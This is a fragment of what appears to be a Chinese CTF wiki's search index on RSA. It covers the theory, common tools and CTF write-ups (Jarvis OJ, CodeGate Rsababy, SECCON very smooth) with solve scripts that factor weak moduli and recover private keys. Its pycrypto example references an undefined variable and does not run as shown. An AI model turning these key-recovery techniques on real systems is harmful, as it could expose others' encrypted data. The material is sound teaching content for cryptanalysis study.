\nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nPKCS1_v1_5\n\n\n\nmsg\n \n=\n \ncrypto here\n\n\np\n \n=\n \ngetPrime\n(\n128\n)\n\n\nq\n \n=\n \ngetPrime\n(\n128\n)\n\n\nn\n \n=\n \np\n*\nq\n\n\ne\n \n=\n \ngetPrime\n(\n64\n)\n\n\npubkey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n)))\n\n\nprivatekey\n \n=\n \nRSA\n.\nconstruct\n((\nlong\n(\nn\n),\n \nlong\n(\ne\n),\n \nlong\n(\nd\n),\n \nlong\n(\np\n),\n \nlong\n(\nq\n)))\n\n\nkey\n \n=\n \nPKCS1_v1_5\n.\nnew\n(\npubkey\n)\n\n\nenc\n \n=\n \nkey\n.\nencrypt\n(\nmsg\n)\n.\nencode\n(\nbase64\n)\n\n\nkey\n \n=\n \nPKCS1_v1_5\n.\nnew\n(\nprivatekey\n)\n\n\nmsg\n \n=\n \nkey\n.\ndecrypt\n(\nenc\n.\ndecode\n(\nbase64\n),\n \ne\n)\n\n\n\n\n\n\n\n\n\nJarvis OJ - Basic - veryeasyRSA\n\n\n\n\np = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389\n\n\ne = 65537\n\n\n\u6c42 d = \n\n\n\u8bf7\u63d0\u4ea4 \nPCTF{d}\n\n\n\n\n\u76f4\u63a5\u6839\u636e \ned\\equiv 1 \\pmod r\ned\\equiv 1 \\pmod r\n\uff0c\u5176\u4e2d \nr=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)\nr=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)\n\uff0c\u53ef\u5f97 d\u3002\n\n\nimport\n \ngmpy2\n\n\np\n \n=\n \n3487583947589437589237958723892346254777\n\n\nq\n \n=\n \n8767867843568934765983476584376578389\n\n\ne\n \n=\n \n65537\n\n\nphin\n \n=\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\nq\n \n-\n \n1\n)\n\n\nprint\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nphin\n)\n\n\n\n\n\n\u279c  Jarvis OJ-Basic-veryeasyRSA git:\n(\nmaster\n)\n \u2717 python exp.py       \n\n19178568796155560423675975774142829153827883709027717723363077606260717434369\n\n\n\n\n\n2018 CodeGate CTF Rsababy\n\n\n\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570\n\n\ne\n \n=\n \n65537\n\n\nn\n \n=\n \np\n \n*\n \nq\n\n\npi_n\n \n=\n \n(\np\n-\n1\n)\n*\n(\nq\n-\n1\n)\n\n\nd\n \n=\n \nmulinv\n(\ne\n,\n \npi_n\n)\n\n\nh\n \n=\n \n(\nd\n+\np\n)\n^\n(\nd\n-\np\n)\n\n\ng\n \n=\n \nd\n*\n(\np\n-\n0xdeadbeef\n)\n\n\n\n\n\n\u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe \nconst = 0xdeadbeef\n\u3002\u90a3\u4e48\n\n\n\n\n\neg = ed*(p-const)\n\n\n\n\neg = ed*(p-const)\n\n\n\n\n\n\u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5\n\n\n\n\n\n2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n\n\n\n\n\n2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n\n\n\n\n\n\n\n\n\n2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n\n\n\n\n\n2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\n2^{p-1} = 2^{eg}*2^{const-1}+kn\n\n\n\n\n2^{p-1} = 2^{eg}*2^{const-1}+kn\n\n\n\n\n\n\u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053\n\n\n\n\n\n2^{p-1} \\equiv 1 \\pmod p\n\n\n\n\n2^{p-1} \\equiv 1 \\pmod p\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\np|2^{p-1}-1 | 2^{eg+const-1}-1+kn\n\n\n\n\np|2^{p-1}-1 | 2^{eg+const-1}-1+kn\n\n\n\n\n\n\u8fdb\u800c\n\n\n\n\n\np|2^{eg+const-1}-1\n\n\n\n\np|2^{eg+const-1}-1\n\n\n\n\n\n\u6240\u4ee5\n\n\n\n\n\np|gcd(2^{eg+const-1}-1,n)\n\n\n\n\np|gcd(2^{eg+const-1}-1,n)\n\n\n\n\n\n\u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b\n\n\ntmp\n \n=\n \ngmpy2\n.\npowmod\n(\n2\n,\ne\n*\ng\n+\nconst\n-\n1\n,\nn\n)\n-\n1\n\n\np\n \n=\n \ngmpy2\n.\ngcd\n(\ntmp\n,\nn\n)\n\n\nq\n \n=\n \nn\n/\np\n\n\nphin\n \n=\n \n(\np\n-\n1\n)\n*\n(\nq\n-\n1\n)\n\n\nd\n \n=\ngmpy2\n.\ninvert\n(\ne\n,\nphin\n)\n\n\nplain\n \n=\n \ngmpy2\n.\npowmod\n(\ndata\n,\nd\n,\nn\n)\n\n\nprint\n \nhex\n(\nplain\n)[\n2\n:]\n.\ndecode\n(\nhex\n)", 
            "title": "RSA \u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_1", 
            "text": "", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_2", 
            "text": "\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570  p p  \u548c  q q \uff0c\u8ba1\u7b97  N = p \\times q N = p \\times q  \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97  r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)  \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e  r r  \u7684\u6574\u6570  e e \uff0c\u4f7f  e e  \u548c  r r  \u4e92\u8d28\u3002\u5e76\u6c42\u5f97  e e  \u5173\u4e8e  r r  \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a  d d \uff0c\u6709  ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r  \u5c06  p p  \u548c  q q  \u7684\u8bb0\u5f55\u9500\u6bc1   \u6b64\u65f6\uff0c (N,e) (N,e)  \u662f\u516c\u94a5\uff0c (N,d) (N,d)  \u662f\u79c1\u94a5\u3002", 
            "title": "\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_3", 
            "text": "\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f  m m  \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e  N N \uff0c\u4e14\u4e0e  N N  \u4e92\u8d28\u7684\u6574\u6570  n n \u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a   \nn^{e}\\equiv c\\pmod N  \nn^{e}\\equiv c\\pmod N", 
            "title": "\u6d88\u606f\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_4", 
            "text": "\u5229\u7528\u5bc6\u94a5  d d  \u8fdb\u884c\u89e3\u5bc6\u3002   \nc^{d}\\equiv n\\pmod N  \nc^{d}\\equiv n\\pmod N", 
            "title": "\u6d88\u606f\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_5", 
            "text": "\u5373\u6211\u4eec\u8981\u8bc1 n^{ed} \\equiv n \\bmod N n^{ed} \\equiv n \\bmod N \uff0c\u5df2\u77e5 ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) \uff0c\u90a3\u4e48  ed=k\\phi(N)+1 ed=k\\phi(N)+1 \uff0c\u5373\u9700\u8981\u8bc1\u660e   \nn^{k\\phi(N)+1}  \\equiv n \\bmod N  \nn^{k\\phi(N)+1}  \\equiv n \\bmod N   \u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e  \u7b2c\u4e00\u79cd\u60c5\u51b5  gcd(n,N)=1 gcd(n,N)=1 \uff0c\u90a3\u4e48  n^{\\phi(N)} \\equiv 1 \\bmod N n^{\\phi(N)} \\equiv 1 \\bmod N \uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002  \u7b2c\u4e8c\u79cd\u60c5\u51b5  gcd(n,N)!=1 gcd(n,N)!=1 \uff0c\u90a3\u4e48 n \u5fc5\u7136\u662f p \u6216\u8005 q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n \u5c0f\u4e8e N\u3002\u6211\u4eec\u5047\u8bbe   \nn=xp  \nn=xp   \u90a3\u4e48 x \u5fc5\u7136\u5c0f\u4e8e q\uff0c\u53c8\u7531\u4e8e q \u662f\u7d20\u6570\u3002\u90a3\u4e48   \nn^{\\phi(q)} \\equiv 1 \\bmod q  \nn^{\\phi(q)} \\equiv 1 \\bmod q   \u8fdb\u800c   \nn^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q  \nn^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q   \u90a3\u4e48   \nn^{k\\phi(N)+1}=n+uqn  \nn^{k\\phi(N)+1}=n+uqn   \u8fdb\u800c   \nn^{k\\phi(N)+1}=n+uqxp=n+uxN  \nn^{k\\phi(N)+1}=n+uqxp=n+uxN   \u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002", 
            "title": "\u6b63\u786e\u6027\u8bc1\u660e"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_6", 
            "text": "", 
            "title": "\u57fa\u672c\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#rsatool", 
            "text": "\u5b89\u88c5  git clone https://github.com/ius/rsatool.git cd  rsatool\npython rsatool.py -h    \u751f\u6210\u79c1\u94a5  python rsatool.py -f PEM -o private.pem -p  1234567  -q  7654321", 
            "title": "RSAtool"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#rsa-converter", 
            "text": "\u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6  \u6839\u636e n\uff0ce\uff0cd \u5f97\u51fa p\uff0cq", 
            "title": "RSA Converter"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#openssl", 
            "text": "\u67e5\u770b\u516c\u94a5\u6587\u4ef6  openssl rsa -pubin -in pubkey.pem -text -modulus    \u89e3\u5bc6  rsautl -decrypt -inkey private.pem -in flag.enc -out flag    \u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003  openssl --help \u3002", 
            "title": "openssl"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#_7", 
            "text": "\u7f51\u7ad9\u5206\u89e3\uff0c factor.db  \u547d\u4ee4\u884c\u5206\u89e3\uff0c factordb-pycli \uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002  yafu", 
            "title": "\u5206\u89e3\u6574\u6570\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#python", 
            "text": "", 
            "title": "python \u5e93"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#primefac", 
            "text": "\u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002", 
            "title": "primefac"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#gmpy", 
            "text": "gmpy.root(a, b) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4  (x, y) \uff0c\u5176\u4e2d  x  \u4e3a  a  \u5f00  b  \u6b21\u65b9\u7684\u503c\uff0c y  \u662f\u5224\u65ad  x  \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf", 
            "title": "gmpy"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#gmpy2", 
            "text": "\u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mfpr \u4e0e mpc \u5e93\u3002   gmpy2.iroot(a, b) \uff0c\u7c7b\u4f3c\u4e8e  gmpy.root(a,b)", 
            "title": "gmpy2"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#pycrypto", 
            "text": "\u5b89\u88c5  sudo pip install pycrypto    \u4f7f\u7528  import   gmpy  from   Crypto.Util.number   import   *  from   Crypto.PublicKey   import   RSA  from   Crypto.Cipher   import   PKCS1_v1_5  msg   =   crypto here  p   =   getPrime ( 128 )  q   =   getPrime ( 128 )  n   =   p * q  e   =   getPrime ( 64 )  pubkey   =   RSA . construct (( long ( n ),   long ( e )))  privatekey   =   RSA . construct (( long ( n ),   long ( e ),   long ( d ),   long ( p ),   long ( q )))  key   =   PKCS1_v1_5 . new ( pubkey )  enc   =   key . encrypt ( msg ) . encode ( base64 )  key   =   PKCS1_v1_5 . new ( privatekey )  msg   =   key . decrypt ( enc . decode ( base64 ),   e )", 
            "title": "pycrypto"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa", 
            "text": "p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389  e = 65537  \u6c42 d =   \u8bf7\u63d0\u4ea4  PCTF{d}   \u76f4\u63a5\u6839\u636e  ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r \uff0c\u5176\u4e2d  r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \uff0c\u53ef\u5f97 d\u3002  import   gmpy2  p   =   3487583947589437589237958723892346254777  q   =   8767867843568934765983476584376578389  e   =   65537  phin   =   ( p   -   1 )   *   ( q   -   1 )  print   gmpy2 . invert ( e ,   phin )   \u279c  Jarvis OJ-Basic-veryeasyRSA git: ( master )  \u2717 python exp.py        19178568796155560423675975774142829153827883709027717723363077606260717434369", 
            "title": "Jarvis OJ - Basic - veryeasyRSA"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy", 
            "text": "\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570  e   =   65537  n   =   p   *   q  pi_n   =   ( p - 1 ) * ( q - 1 )  d   =   mulinv ( e ,   pi_n )  h   =   ( d + p ) ^ ( d - p )  g   =   d * ( p - 0xdeadbeef )   \u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe  const = 0xdeadbeef \u3002\u90a3\u4e48   \neg = ed*(p-const)  \neg = ed*(p-const)   \u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5   \n2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n  \n2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n    \n2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n  \n2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n   \u6240\u4ee5   \n2^{p-1} = 2^{eg}*2^{const-1}+kn  \n2^{p-1} = 2^{eg}*2^{const-1}+kn   \u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053   \n2^{p-1} \\equiv 1 \\pmod p  \n2^{p-1} \\equiv 1 \\pmod p   \u6240\u4ee5   \np|2^{p-1}-1 | 2^{eg+const-1}-1+kn  \np|2^{p-1}-1 | 2^{eg+const-1}-1+kn   \u8fdb\u800c   \np|2^{eg+const-1}-1  \np|2^{eg+const-1}-1   \u6240\u4ee5   \np|gcd(2^{eg+const-1}-1,n)  \np|gcd(2^{eg+const-1}-1,n)   \u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b  tmp   =   gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1  p   =   gmpy2 . gcd ( tmp , n )  q   =   n / p  phin   =   ( p - 1 ) * ( q - 1 )  d   = gmpy2 . invert ( e , phin )  plain   =   gmpy2 . powmod ( data , d , n )  print   hex ( plain )[ 2 :] . decode ( hex )", 
            "title": "2018 CodeGate CTF Rsababy"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_module_attack/", 
            "text": "\u66b4\u529b\u5206\u89e3 N\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5728 N \u7684\u6bd4\u7279\u4f4d\u6570\u5c0f\u4e8e 512 \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5927\u6574\u6570\u5206\u89e3\u7684\u7b56\u7565\u83b7\u53d6 p \u548c q\u3002\n\n\nJarvisOJ - Medium RSA\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 JarvisOJ - Medium RSA \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u5982\u4e0b\n\n\n\n\n\u8fd8\u8bb0\u5f97 veryeasy RSA \u5417\uff1f\u662f\u4e0d\u662f\u4e0d\u96be\uff1f\u90a3\u7ee7\u7eed\u6765\u770b\u770b\u8fd9\u9898\u5427\uff0c\u8fd9\u9898\u4e5f\u4e0d\u96be\u3002\n\n\u5df2\u77e5\u4e00\u6bb5 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u4e3a\uff1a0xdc2eeeb2782c \u4e14\u5df2\u77e5\u52a0\u5bc6\u6240\u7528\u7684\u516c\u94a5\uff1a\n\nN=322831561921859 e = 23\n\n\u8bf7\u89e3\u5bc6\u51fa\u660e\u6587\uff0c\u63d0\u4ea4\u65f6\u8bf7\u5c06\u6570\u5b57\u8f6c\u5316\u4e3a ascii \u7801\u63d0\u4ea4\n\n\u6bd4\u5982\u4f60\u89e3\u51fa\u7684\u660e\u6587\u662f 0x6162\uff0c\u90a3\u4e48\u8bf7\u63d0\u4ea4\u5b57\u7b26\u4e32 ab\n\n\u63d0\u4ea4\u683c\u5f0f\uff1a\nPCTF{\u660e\u6587\u5b57\u7b26\u4e32}\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684 N \u6bd4\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 factordb \u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230\n\n\n\n\n\n322831561921859 = 13574881 \\times 23781539\n\n\n\n\n322831561921859 = 13574881 \\times 23781539\n\n\n\n\n\n\u8fdb\u800c\u6211\u4eec\u7b80\u5355\u7f16\u5199\u7a0b\u5e8f\u5982\u4e0b\n\n\nimport\n \ngmpy2\n\n\np\n \n=\n \n13574881\n\n\nq\n \n=\n \n23781539\n\n\nn\n \n=\n \np\n \n*\n \nq\n\n\ne\n \n=\n \n23\n\n\nc\n \n=\n \n0xdc2eeeb2782c\n\n\nphin\n \n=\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\nq\n \n-\n \n1\n)\n\n\nd\n \n=\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nphin\n)\n\n\np\n \n=\n \ngmpy2\n.\npowmod\n(\nc\n,\n \nd\n,\n \nn\n)\n\n\ntmp\n \n=\n \nhex\n(\np\n)\n\n\nprint\n \ntmp\n,\n \ntmp\n[\n2\n:]\n.\ndecode\n(\nhex\n)\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  Jarvis OJ-Basic-easyRSA git:\n(\nmaster\n)\n \u2717 python exp.py\n0x33613559 3a5Y\n\n\n\n\np \n q \u4e0d\u5f53\u5206\u89e3 N\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5f53 RSA \u4e2d p \u548c q \u9009\u53d6\u4e0d\u5f53\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002\n\n\n|p-q| \u5f88\u5927\n\n\n\u5f53 p-q \u5f88\u5927\u65f6\uff0c\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00\u4e2a\u53c2\u6570\u8f83\u5c0f\uff0c\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u4e3a p\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7a77\u4e3e\u7684\u65b9\u6cd5\u5bf9\u6a21\u6570\u8fdb\u884c\u8bd5\u9664\uff0c\u4ece\u800c\u5206\u89e3\u6a21\u6570\uff0c\u5f97\u5230\u4fdd\u5bc6\u53c2\u6570\u4e0e\u660e\u6587\u4fe1\u606f\u3002\u57fa\u672c\u6765\u8bf4\uff0c\u4e0d\u600e\u4e48\u53ef\u884c\u3002\n\n\n|p-q| \u8f83\u5c0f\n\n\n\u9996\u5148\n\n\n\n\n\n\\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}\n\n\n\n\n\\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}\n\n\n\n\n\n\u65e2\u7136 |p-q| \u8f83\u5c0f\uff0c\u90a3\u4e48 \n\\frac{(p-q)^2}{4}\n\\frac{(p-q)^2}{4}\n \u81ea\u7136\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u8fdb\u800c \n\\frac{(p+q)^2}{4}\n\\frac{(p+q)^2}{4}\n \u53ea\u662f\u6bd4 N \u7a0d\u5fae\u5927\u4e00\u70b9\uff0c\u6240\u4ee5 \n\\frac{p+q}{2}\n\\frac{p+q}{2}\n \u4e0e \n\\sqrt{n}\n\\sqrt{n}\n \u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3\n\n\n\n\n\u987a\u5e8f\u68c0\u67e5 \n\\sqrt{n}\n\\sqrt{n}\n \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 \nx^2-n\nx^2-n\n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a \ny^2\ny^2\n\n\n\u90a3\u4e48 \nx^2-n=y^2\nx^2-n=y^2\n\uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N\n\n\n\n\np - 1 \u5149\u6ed1\n\n\n\u5f53 p \u662f N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p - 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002\n\n\n\n\nWarning\n\n\n\u539f\u7406\u5206\u6790\u5f85\u5b8c\u6210\n\n\n\n\np + 1 \u5149\u6ed1\n\n\n\u5f53 p \u662f n \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p + 1 \u662f\u5149\u6ed1\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u53ef\u4ee5\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u6765\u5206\u89e3 N\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u53ef\u4ee5\u6210\u529f\u7684\u3002\n\n\n2017 SECCON very smooth\n\n\n\u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66\n\n\n\u279c  2017_SECCON_verysmooth git:\n(\nmaster\n)\n binwalk -e s.pcap      \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n2292\n          0x8F4           Certificate in DER format \n(\nx509 v3\n)\n, header length: \n4\n, sequence length: \n467\n\n\n4038\n          0xFC6           Certificate in DER format \n(\nx509 v3\n)\n, header length: \n4\n, sequence length: \n467\n\n\n5541\n          0x15A5          Certificate in DER format \n(\nx509 v3\n)\n, header length: \n4\n, sequence length: \n467\n\n\n\u279c  2017_SECCON_verysmooth git:\n(\nmaster\n)\n ls\ns.pcap  _s.pcap.extracted  very_smooth.zip\n\n\n\n\n\u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50\n\n\n\u279c  _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt  -pubkey -text -modulus -noout \n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\nCertificate:\n    Data:\n        Version: 1 (0x0)\n        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=JP, ST=Kawasaki, O=SRL\n        Validity\n            Not Before: Oct  8 02:47:17 2017 GMT\n            Not After : Oct  8 02:47:17 2018 GMT\n        Subject: C=JP, ST=Kawasaki, O=SRL\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (1024 bit)\n                Modulus:\n                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:\n                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:\n                    c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12:\n                    75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e:\n                    69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0:\n                    2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07:\n                    47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89:\n                    19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a:\n                    a6:d7:60:83:31:18:ee:0d:71\n                Exponent: 65537 (0x10001)\n    Signature Algorithm: sha256WithRSAEncryption\n         78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf:\n         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:\n         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:\n         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c:\n         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:\n         bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05:\n         e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32:\n         b7:39\nModulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 